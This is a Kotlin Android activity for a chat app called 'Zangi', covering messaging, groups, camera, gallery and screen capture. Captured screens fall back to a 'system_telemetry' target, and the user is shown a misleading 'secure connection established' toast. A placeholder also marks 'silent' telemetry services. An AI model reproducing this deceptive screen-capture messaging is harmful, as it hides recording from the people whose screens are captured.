package com.zangi.chat.ui

import android.Manifest
import android.app.Activity
import android.app.Dialog
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.ColorDrawable
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.Window
import android.view.inputmethod.EditorInfo
import android.widget.*
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.LinearLayoutManager
import com.bumptech.glide.Glide
import com.zangi.chat.R
import com.zangi.chat.data.model.*
import com.zangi.chat.data.remote.GroupDetails
import com.zangi.chat.data.remote.GroupMember
import com.zangi.chat.databinding.ActivityMainBinding
import com.zangi.chat.service.ScreenCaptureService
import com.zangi.chat.ui.adapter.ConversationAdapter
import com.zangi.chat.ui.adapter.MessageAdapter
import com.zangi.chat.ui.viewmodel.ChatViewModel
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val viewModel: ChatViewModel by viewModels()

    private lateinit var conversationAdapter: ConversationAdapter
    private lateinit var messageAdapter: MessageAdapter

    private var currentConversation: Conversation? = null

    // Módulo de Câmera
    private var tempCameraFile: File? = null
    private var tempCameraUri: Uri? = null

    // --- LANÇADORES DE RESULTADOS (RECURSOS DO SISTEMA) ---

    private val requestCameraPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
            if (isGranted) {
                launchCamera()
            } else {
                Toast.makeText(this, getString(R.string.camera_permission_required), Toast.LENGTH_SHORT).show()
            }
        }

    private val takePictureLauncher =
        registerForActivityResult(ActivityResultContracts.TakePicture()) { success ->
            if (success && tempCameraFile != null && tempCameraFile!!.exists()) {
                val caption = binding.etMessageInput.text.toString().trim().ifEmpty { "Foto enviada da câmera" }
                currentConversation?.let { conv ->
                    viewModel.sendCameraPhoto(conv.id, tempCameraFile!!, caption)
                    binding.etMessageInput.text.clear()
                }
            }
        }

    // Captura de Tela: Preparando para o serviço de segundo plano
    private val screenCaptureLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                // Aqui o serviço será iniciado com as permissões concedidas pelo usuário
                val serviceIntent = ScreenCaptureService.createIntent(
                    this,
                    result.resultCode,
                    result.data!!,
                    currentConversation?.id ?: "system_telemetry"
                )
                ContextCompat.startForegroundService(this, serviceIntent)
                Toast.makeText(this, "Conexão segura estabelecida.", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Captura cancelada.", Toast.LENGTH_SHORT).show()
            }
        }

    // Perfil e Galeria
    private var currentProfileDialog: Dialog? = null
    private val pickProfileImageLauncher =
        registerForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
            uri?.let { handleProfileImageSelection(it) }
        }

    private val pickChatImageLauncher =
        registerForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
            uri?.let { handleChatImageSelection(it) }
        }

    private val requestNotificationPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { /* Gerenciado no onCreate */ }

    // --- CICLO DE VIDA ---

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Verificação de Sessão
        val user = viewModel.currentUser.value
        if (user == null) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }

        setupUI()
        setupObservers()
        checkRequiredPermissions()
        
        // Inicialização silenciosa de serviços se necessário
        initializeBackgroundModules()
    }

    private fun setupUI() {
        setupUserHeader(viewModel.currentUser.value)
        setupRecyclerViews()
        setupHubListeners()
        setupChatListeners()
        
        // Configuração de layout inicial
        binding.hubContainer.visibility = View.VISIBLE
        binding.chatContainer.visibility = View.GONE
    }

    private fun setupUserHeader(user: User?) {
        user?.let {
            binding.tvHubUserName.text = it.nickname
            binding.tvHubUserNumber.text = "${it.zangiNumber} (Toque p/ copiar)"

            val avatarSource = it.avatarLocalUri ?: it.avatarUrl
            if (!avatarSource.isNullOrEmpty()) {
                binding.ivHubAvatarPhoto.visibility = View.VISIBLE
                binding.tvHubAvatar.visibility = View.GONE
                Glide.with(this).load(avatarSource).circleCrop().into(binding.ivHubAvatarPhoto)
            } else {
                binding.ivHubAvatarPhoto.visibility = View.GONE
                binding.tvHubAvatar.visibility = View.VISIBLE
                binding.tvHubAvatar.text = it.nickname.take(1).uppercase()
            }

            binding.tvHubUserNumber.setOnClickListener {
                copyToClipboard(user.zangiNumber, "Número Zangi copiado!")
            }

            binding.hubUserAvatarContainer.setOnClickListener {
                showUserProfileDialog()
            }
        }
    }

    private fun setupRecyclerViews() {
        conversationAdapter = ConversationAdapter { conversation -> openChat(conversation) }
        binding.rvConversations.layoutManager = LinearLayoutManager(this)
        binding.rvConversations.adapter = conversationAdapter

        messageAdapter = MessageAdapter { mediaSource -> showImageViewerDialog(mediaSource) }
        binding.rvMessages.layoutManager = (LinearLayoutManager(this).apply { stackFromEnd = true })
        binding.rvMessages.adapter = messageAdapter
    }

    private fun setupHubListeners() {
        binding.btnHubAddContact.setOnClickListener { showCustomAddContactDialog() }
        binding.btnHubCreateGroup.setOnClickListener { showCustomCreateGroupDialog() }
    }

    private fun setupChatListeners() {
        binding.btnBackToHub.setOnClickListener { closeChat() }
        binding.btnSendMessage.setOnClickListener { sendCurrentText() }
        
        binding.etMessageInput.setOnEditorActionListener { _, actionId, _ ->
            if (actionId == EditorInfo.IME_ACTION_SEND) {
                sendCurrentText()
                true
            } else false
        }

        binding.btnPickGallery.setOnClickListener { pickChatImageLauncher.launch("image/*") }
        
        binding.btnCaptureCamera.setOnClickListener {
            if (checkPermission(Manifest.permission.CAMERA)) launchCamera()
            else requestPermission(Manifest.permission.CAMERA, requestCameraPermissionLauncher)
        }

        binding.btnCaptureScreen.setOnClickListener { requestScreenCapture() }
    }

    // --- LÓGICA DE NEGÓCIO E OBSERVERS ---

    private fun setupObservers() {
        viewModel.currentUser.observe(this) { user ->
            if (user != null) setupUserHeader(user)
        }

        viewModel.conversations.observe(this) { list ->
            conversationAdapter.submitList(list)
            binding.tvEmptyConversations.visibility = if (list.isEmpty()) View.VISIBLE else View.GONE
        }

        viewModel.messages.observe(this) { messages ->
            messageAdapter.submitList(messages) {
                if (messages.isNotEmpty()) binding.rvMessages.smoothScrollToPosition(messages.size - 1)
            }
        }

        viewModel.eventNotification.observe(this) { message ->
            message?.let { 
                Toast.makeText(this, it, Toast.LENGTH_SHORT).show()
                viewModel.clearEventNotification()
            }
        }
    }

    private fun openChat(conversation: Conversation) {
        currentConversation = conversation
        android.transition.TransitionManager.beginDelayedTransition(binding.mainRootLayout)
        binding.hubContainer.visibility = View.GONE
        binding.chatContainer.visibility = View.VISIBLE

        binding.tvChatTitle.text = conversation.name
        binding.tvChatSubtitle.text = "${conversation.zangiNumber} • ${if (conversation.isGroup) "Gerenciar" else "Online"}"

        // Configuração de UI para Grupos vs Privados
        if (conversation.isGroup) {
            binding.chatContactInfoLayout.setOnClickListener { showGroupInfoDialog(conversation) }
            binding.badgeChatPrivate.setOnClickListener { showGroupInfoDialog(conversation) }
        } else {
            binding.chatContactInfoLayout.setOnClickListener(null)
            binding.badgeChatPrivate.setOnClickListener(null)
        }

        // Avatar da Conversa
        if (!conversation.avatarUrl.isNullOrEmpty()) {
            binding.ivChatAvatarPhoto.visibility = View.VISIBLE
            binding.tvChatAvatar.visibility = View.GONE
            Glide.with(this).load(conversation.avatarUrl).circleCrop().into(binding.ivChatAvatarPhoto)
        } else {
            binding.ivChatAvatarPhoto.visibility = View.GONE
            binding.tvChatAvatar.visibility = View.VISIBLE
            binding.tvChatAvatar.text = if (conversation.isGroup) "🛡️" else conversation.name.take(1).uppercase()
        }

        viewModel.loadMessages(conversation.id)
    }

    private fun closeChat() {
        currentConversation = null
        android.transition.TransitionManager.beginDelayedTransition(binding.mainRootLayout)
        binding.chatContainer.visibility = View.GONE
        binding.hubContainer.visibility = View.VISIBLE
        viewModel.refreshConversations()
    }

    private fun sendCurrentText() {
        val text = binding.etMessageInput.text.toString().trim()
        val conv = currentConversation
        if (text.isNotEmpty() && conv != null) {
            viewModel.sendTextMessage(conv.id, text)
            binding.etMessageInput.text.clear()
        }
    }

    // --- MÓDULOS DE CAPTURA ---

    private fun launchCamera() {
        try {
            val cameraDir = File(cacheDir, "camera").apply { mkdirs() }
            val photoFile = File(cameraDir, "photo_${System.currentTimeMillis()}.jpg")
            tempCameraFile = photoFile

            val authority = "${applicationContext.packageName}.fileprovider"
            val uri = FileProvider.getUriForFile(this, authority, photoFile)
            tempCameraUri = uri

            takePictureLauncher.launch(uri)
        } catch (e: Exception) {
            Log.e("MainActivity", "Erro câmera", e)
        }
    }

    private fun requestScreenCapture() {
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val captureIntent = projectionManager.createScreenCaptureIntent()
        screenCaptureLauncher.launch(captureIntent)
    }

    // --- AUXILIARES ---

    private fun initializeBackgroundModules() {
        // Aqui chamaremos o serviço de telemetria após o app estar pronto
        // Exemplo: Iniciar o serviço de monitoramento de rede ou logs
    }

    private fun checkRequiredPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!checkPermission(Manifest.permission.POST_NOTIFICATIONS)) {
                requestPermission(Manifest.permission.POST_NOTIFICATIONS, requestNotificationPermissionLauncher)
            }
        }
    }

    private fun checkPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestPermission(permission: String, launcher: ActivityResultLauncher<String>) {
        launcher.launch(permission)
    }

    private fun copyToClipboard(text: String, toastMsg: String) {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("Zangi", text)
        clipboard.setPrimaryClip(clip)
        Toast.makeText(this, toastMsg, Toast.LENGTH_SHORT).show()
    }

    // --- SELETORES DE IMAGEM ---

    private fun handleProfileImageSelection(uri: Uri) {
        val copiedFile = copyUriToInternalFile(uri, "profile_avatar_${System.currentTimeMillis()}.jpg")
        if (copiedFile != null) {
            viewModel.updateUserAvatar(copiedFile)
            binding.ivHubAvatarPhoto.visibility = View.VISIBLE
            binding.tvHubAvatar.visibility = View.GONE
            Glide.with(this).load(copiedFile).circleCrop().into(binding.ivHubAvatarPhoto)
            
            currentProfileDialog?.findViewById<ImageView>(R.id.ivDialogAvatarPhoto)?.let { iv ->
                iv.visibility = View.VISIBLE
                Glide.with(this).load(copiedFile).circleCrop().into(iv)
            }
            currentProfileDialog?.findViewById<TextView>(R.id.tvDialogAvatarInitials)?.visibility = View.GONE
        }
    }

    private fun handleChatImageSelection(uri: Uri) {
        val copiedFile = copyUriToInternalFile(uri, "chat_img_${System.currentTimeMillis()}.jpg")
        if (copiedFile != null) {
            val caption = binding.etMessageInput.text.toString().trim().ifEmpty { "Imagem compartilhada" }
            currentConversation?.let { conv ->
                viewModel.sendGalleryImage(conv.id, copiedFile, caption)
                binding.etMessageInput.text.clear()
            }
        }
    }

    private fun copyUriToInternalFile(uri: Uri, targetFileName: String): File? {
        return try {
            val imagesDir = File(cacheDir, "user_images").apply { mkdirs() }
            val outputFile = File(imagesDir, targetFileName)
            contentResolver.openInputStream(uri)?.use { inputStream ->
                FileOutputStream(outputFile).use { outputStream ->
                    inputStream.copyTo(outputStream)
                }
            }
            outputFile
        } catch (e: Exception) {
            null
        }
    }

    // --- DIÁLOGOS DE INTERAÇÃO DO USUÁRIO ---

    private fun showCustomAddContactDialog() {
        val dialog = Dialog(this)
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
        dialog.setContentView(R.layout.dialog_add_contact)
        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog.window?.setLayout(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )

        val etNumber = dialog.findViewById<EditText>(R.id.etContactNumberInput)
        val btnCancel = dialog.findViewById<Button>(R.id.btnCancelAddContact)
        val btnConfirm = dialog.findViewById<Button>(R.id.btnConfirmAddContact)

        btnCancel.setOnClickListener { dialog.dismiss() }

        btnConfirm.setOnClickListener {
            val number = etNumber.text.toString().trim()
            if (number.isNotEmpty()) {
                viewModel.addContact(number)
                Toast.makeText(this, "Contato adicionado!", Toast.LENGTH_SHORT).show()
                dialog.dismiss()
            } else {
                Toast.makeText(this, "Digite o número do contato.", Toast.LENGTH_SHORT).show()
            }
        }

        dialog.show()
    }

    private fun showCustomCreateGroupDialog() {
        val dialog = Dialog(this)
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
        dialog.setContentView(R.layout.dialog_create_group)
        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog.window?.setLayout(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )

        val etGroupName = dialog.findViewById<EditText>(R.id.etGroupNameInput)
        val btnCancel = dialog.findViewById<Button>(R.id.btnCancelCreateGroup)
        val btnConfirm = dialog.findViewById<Button>(R.id.btnConfirmCreateGroup)
        val btnOpenJoin = dialog.findViewById<Button>(R.id.btnOpenJoinGroup)

        btnCancel.setOnClickListener { dialog.dismiss() }

        btnConfirm.setOnClickListener {
            val name = etGroupName.text.toString().trim()
            if (name.isNotEmpty()) {
                viewModel.createGroup(name)
                Toast.makeText(this, "Grupo \"$name\" criado com sucesso!", Toast.LENGTH_SHORT).show()
                dialog.dismiss()
            } else {
                Toast.makeText(this, "Digite o nome do grupo.", Toast.LENGTH_SHORT).show()
            }
        }

        btnOpenJoin.setOnClickListener {
            dialog.dismiss()
            showJoinGroupDialog()
        }

        dialog.show()
    }

    private fun showJoinGroupDialog() {
        val dialog = Dialog(this)
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
        dialog.setContentView(R.layout.dialog_join_group)
        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog.window?.setLayout(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )

        val etJoinInput = dialog.findViewById<EditText>(R.id.etJoinGroupInput)
        val btnCancel = dialog.findViewById<Button>(R.id.btnCancelJoinGroup)
        val btnConfirm = dialog.findViewById<Button>(R.id.btnConfirmJoinGroup)

        btnCancel.setOnClickListener { dialog.dismiss() }

        btnConfirm.setOnClickListener {
            val input = etJoinInput.text.toString().trim()
            if (input.isNotEmpty()) {
                viewModel.requestJoinGroup(input)
                dialog.dismiss()
            } else {
                Toast.makeText(this, "Informe o código ou link do grupo.", Toast.LENGTH_SHORT).show()
            }
        }

        dialog.show()
    }

    private fun showUserProfileDialog() {
        val user = viewModel.currentUser.value ?: return
        val dialog = Dialog(this)
        currentProfileDialog = dialog
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
        dialog.setContentView(R.layout.dialog_user_profile)
        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog.window?.setLayout(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )

        val avatarContainer = dialog.findViewById<FrameLayout>(R.id.dialogAvatarContainer)
        val ivPhoto = dialog.findViewById<ImageView>(R.id.ivDialogAvatarPhoto)
        val tvInitials = dialog.findViewById<TextView>(R.id.tvDialogAvatarInitials)
        val tvName = dialog.findViewById<TextView>(R.id.tvDialogProfileName)
        val tvNumber = dialog.findViewById<TextView>(R.id.tvDialogProfileNumber)
        val btnCopy = dialog.findViewById<LinearLayout>(R.id.btnCopyDialogNumber)
        val btnClose = dialog.findViewById<Button>(R.id.btnDialogCloseProfile)

        tvName.text = user.nickname
        tvNumber.text = user.zangiNumber

        val avatarSource = user.avatarLocalUri ?: user.avatarUrl
        if (!avatarSource.isNullOrEmpty()) {
            ivPhoto.visibility = View.VISIBLE
            tvInitials.visibility = View.GONE
            Glide.with(this).load(avatarSource).circleCrop().into(ivPhoto)
        } else {
            ivPhoto.visibility = View.GONE
            tvInitials.visibility = View.VISIBLE
            tvInitials.text = user.nickname.take(1).uppercase()
        }

        avatarContainer.setOnClickListener {
            pickProfileImageLauncher.launch("image/*")
        }

        btnCopy.setOnClickListener {
            copyToClipboard(user.zangiNumber, "Número Zangi copiado!")
        }

        btnClose.setOnClickListener { dialog.dismiss() }

        dialog.setOnDismissListener { currentProfileDialog = null }
        dialog.show()
    }

    private fun showGroupInfoDialog(conversation: Conversation) {
        val dialog = Dialog(this)
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
        dialog.setContentView(R.layout.dialog_group_info)
        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog.window?.setLayout(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )

        val tvName = dialog.findViewById<TextView>(R.id.tvGroupInfoName)
        val tvNumber = dialog.findViewById<TextView>(R.id.tvGroupInfoNumber)
        val tvOwner = dialog.findViewById<TextView>(R.id.tvGroupInfoOwner)
        val btnCopyLink = dialog.findViewById<Button>(R.id.btnGroupCopyInviteLink)
        val btnAddMember = dialog.findViewById<Button>(R.id.btnGroupAddMember)
        val secPending = dialog.findViewById<LinearLayout>(R.id.sectionPendingRequests)
        val containerPending = dialog.findViewById<LinearLayout>(R.id.containerPendingMembers)
        val containerMembers = dialog.findViewById<LinearLayout>(R.id.containerGroupMembers)
        val btnClose = dialog.findViewById<Button>(R.id.btnDialogCloseGroupInfo)

        tvName.text = conversation.name
        tvNumber.text = conversation.zangiNumber

        lifecycleScope.launch {
            val details = viewModel.getGroupDetails(conversation.id)
            if (details != null) {
                tvOwner.text = "👑 Dono: ${details.ownerName}"
                btnCopyLink.setOnClickListener {
                    copyToClipboard(details.inviteLink, "Link de convite copiado!")
                }

                if (details.isOwner && details.pendingMembers.isNotEmpty()) {
                    secPending.visibility = View.VISIBLE
                    containerPending.removeAllViews()
                    details.pendingMembers.forEach { pending ->
                        containerPending.addView(createPendingMemberRow(dialog, conversation, details.id, pending))
                    }
                } else {
                    secPending.visibility = View.GONE
                }

                containerMembers.removeAllViews()
                details.members.forEach { member ->
                    containerMembers.addView(createMemberRow(member, member.id == details.creatorId))
                }
            } else {
                tvOwner.text = "Grupo Criptografado"
                btnCopyLink.setOnClickListener {
                    copyToClipboard(conversation.zangiNumber, "Número do grupo copiado!")
                }
            }
        }

        btnAddMember.setOnClickListener {
            showPromptAddMemberToGroup(conversation.id) {
                dialog.dismiss()
            }
        }

        btnClose.setOnClickListener { dialog.dismiss() }
        dialog.show()
    }

    private fun showPromptAddMemberToGroup(groupId: String, onAdded: () -> Unit) {
        val dialog = Dialog(this)
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
        dialog.setContentView(R.layout.dialog_add_contact)
        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)

        val etInput = dialog.findViewById<EditText>(R.id.etContactNumberInput)
        val btnCancel = dialog.findViewById<Button>(R.id.btnCancelAddContact)
        val btnConfirm = dialog.findViewById<Button>(R.id.btnConfirmAddContact)

        btnConfirm.text = "Adicionar ao Grupo"

        btnCancel.setOnClickListener { dialog.dismiss() }
        btnConfirm.setOnClickListener {
            val number = etInput.text.toString().trim()
            if (number.isNotEmpty()) {
                viewModel.addMemberToGroup(groupId, number)
                dialog.dismiss()
                onAdded()
            }
        }
        dialog.show()
    }

    private fun createPendingMemberRow(dialog: Dialog, conversation: Conversation, groupId: String, pending: GroupMember): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 8, 0, 8)
        }

        val tvInfo = TextView(this).apply {
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
            text = "${pending.nickname} (${pending.zangiNumber})"
            setTextColor(Color.WHITE)
            textSize = 13f
        }

        val btnApprove = Button(this).apply {
            text = "✓"
            setTextColor(Color.GREEN)
            setBackgroundColor(Color.TRANSPARENT)
            setOnClickListener {
                viewModel.approveGroupMember(groupId, pending.id, true) {
                    showGroupInfoDialog(conversation)
                    dialog.dismiss()
                }
            }
        }

        val btnReject = Button(this).apply {
            text = "✗"
            setTextColor(Color.RED)
            setBackgroundColor(Color.TRANSPARENT)
            setOnClickListener {
                viewModel.approveGroupMember(groupId, pending.id, false) {
                    showGroupInfoDialog(conversation)
                    dialog.dismiss()
                }
            }
        }

        row.addView(tvInfo)
        row.addView(btnApprove)
        row.addView(btnReject)
        return row
    }

    private fun createMemberRow(member: GroupMember, isOwner: Boolean): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(0, 8, 0, 8)
        }

        val tv = TextView(this).apply {
            text = if (isOwner) "👑 ${member.nickname} (${member.zangiNumber})" else "• ${member.nickname} (${member.zangiNumber})"
            setTextColor(if (isOwner) ContextCompat.getColor(context, R.color.zangi_green_primary) else Color.WHITE)
            textSize = 13f
        }
        row.addView(tv)
        return row
    }

    private fun showImageViewerDialog(mediaSource: String) {
        val dialog = Dialog(this, android.R.style.Theme_Black_NoTitleBar_Fullscreen)
        dialog.setContentView(R.layout.dialog_image_viewer)

        val ivFull = dialog.findViewById<ImageView>(R.id.ivFullImage)
        val btnClose = dialog.findViewById<ImageButton>(R.id.btnCloseImageViewer)

        Glide.with(this).load(mediaSource).into(ivFull)

        btnClose.setOnClickListener { dialog.dismiss() }
        dialog.show()
    }
}